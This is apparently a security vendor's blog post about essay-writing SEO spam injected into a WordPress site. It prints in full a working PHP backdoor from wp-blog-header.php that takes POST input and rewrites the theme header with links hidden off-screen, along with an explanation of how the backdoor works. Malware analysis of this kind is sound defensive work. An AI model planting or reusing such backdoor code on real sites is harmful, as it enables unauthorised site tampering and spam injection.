@@ -1,0 +1,50 @@
+Not Just Pills or Payday Loans, It’s Essay SEO SPAM!
+
+Remember back in school or college when you had to write pages and pages of long essays, but had no time to write them? Or maybe you were just too lazy? Yeah, good times. Well, it seems like some companies are trying to end this problem. They are offering services where clients pay them to write these essays for you.
+The problem is this is not only wrong, but it’s also becoming a competitive market where some companies are leveraging SEO spam to gain better rankings on search engines (i.e., Google, Bing). They are also using popular sites like bleacherreport.com and joomlacode.org to add their spam links.
+Here are a couple example URL’s from sites that got hit (URL’s are still showing spam):
+
+httx://bleacherreport .com/users/4065601-community-service-essays
+httx://joomlacode .org/gf/download/trackeritem/32806/131536/online-academic-writers.html
+
+If you think you have seen all kinds of SEO spam, think again. We just found a new one: the Essay SEO spam.
+How Did We Find It?
+Easy, our free malware scanner SiteCheck was flagging a website as infected.
+This was the payload:
+
+At first, it appeared to be a false positive, but then I realized that this was an engineering website and this “paper writing services” content couldn’t possibly have anything to do with it.
+After checking out some of the flagged links I got to this “final” website: httx://www.paperhelp .org/order.html. We are not implying they are behind the attacks, but it wouldn’t be a stretch of the imagination to think that they likely hired an SEO company ,and that company could be using extremely blackhat techniques.
+Who knows…
+Where Was This Infection?
+What got my attention was this tag at the beginning of the code:
+"<div id="links-s" style="position:absolute; top:-4290px;">"
+This is usually related with dynamic content placed in the header of the file. So, yes, in this case it was located on this page:
+"./wp-content/themes/display/header.php"
+How Did It Get Injected?
+While cleaning the the website we found a backdoor that was inserted into this file: ./wp-blog-header.php:
+if (isset($_POST['link'])){
+$f_p=explode("<>",$_POST['link']);
+$link='';
+foreach ($f_p as $f){
+$f_a=explode("|",$f);
+$link.='<a href="'.$f_a[0].'">'.$f_a[1].'</a>'.$f_a[2].' ';
+}
+$link_div='<div id="links-s" style="position:absolute; top:-4290px;">'.$link.'</div>';
+$heder="wp-content/themes/display/header.php";
+$p=file_get_contents($heder);
+if (preg_match('|(<div id="links-s".*?</div>)|s',$p)){ $p=preg_replace('|(<div id="links-s".*?</div>)|s','',$p);}
+preg_match('|(<body.*>)s|',$p,$bodys);
+$body=$bodys[1]." ".$link_div;
+$p_n=preg_replace('|(<body.*>)s|',"$body",$p);
+$fp = fopen($heder, 'w');fwrite($fp, $p_n);fclose($fp);
+echo "succes";
+}
+I am not a developer so I asked one of our developers (Ante Kresic) how this backdoor worked, and here is his explanation:
+This backdoor was inserted in the wp-blog-header.php file, which is the first file that is read in WordPress, so this works on the whole site. The $_POST[‘link’] gives permission to add content in a website, in this specific case, it was added in the header.php file:
+$heder="wp-content/themes/display/header.php";
+So basically, the hacker is sending a payload using this post variable ‘link’, filled with ‘<>’ and ‘|’ characters written in a specific format. These are separated into multiple entries and they all show up in the header.php file, printed out as “succes” :
+echo "succes";
+
+The irony in the entire story could be traced back to a simple indicator that something was wrong. These attackers were advertising essay writing services using words like “heder” and “succes”.
+
+Have you run into any sites with similar scams or spam? If you’re not sure if your site, or one you’re visiting is infected, run a free malware scan. If you need help cleaning up a site, check out Sucuri cleanup services.
